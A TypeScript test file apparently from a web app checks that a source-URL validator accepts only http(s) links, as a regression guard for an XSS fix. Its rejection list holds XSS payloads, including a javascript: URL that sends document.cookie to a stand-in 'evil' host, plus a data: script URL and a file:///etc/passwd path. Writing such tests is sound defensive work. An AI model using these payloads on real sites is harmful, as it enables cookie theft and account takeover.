import { describe, expect, test } from "bun:test";
import type { AreaItem } from "../src/types";
import { getValidSourceUrl } from "../src/views/item-detail/sourceActions";

const item = (sourceUrl?: string) => ({ sourceUrl }) as AreaItem;

// Regression guard for the card/detail XSS fix: only http(s) URLs may reach an
// href / window.open.
describe("getValidSourceUrl", () => {
	test.each([
		"http://example.com/",
		"https://example.com/path?q=1",
	])("accepts %s", (url) => {
		expect(getValidSourceUrl(item(url))).toBe(url);
	});

	test.each([
		"javascript:alert(1)",
		"javascript:fetch('https://evil/'+document.cookie)",
		"data:text/html,<script>alert(1)</script>",
		"file:///etc/passwd",
		"vbscript:msgbox(1)",
		"  javascript:alert(1)  ",
		"not a url",
		"/relative/path",
		"",
	])("rejects %s", (url) => {
		expect(getValidSourceUrl(item(url))).toBeNull();
	});

	test("returns null when sourceUrl is absent", () => {
		expect(getValidSourceUrl(item(undefined))).toBeNull();
	});
});
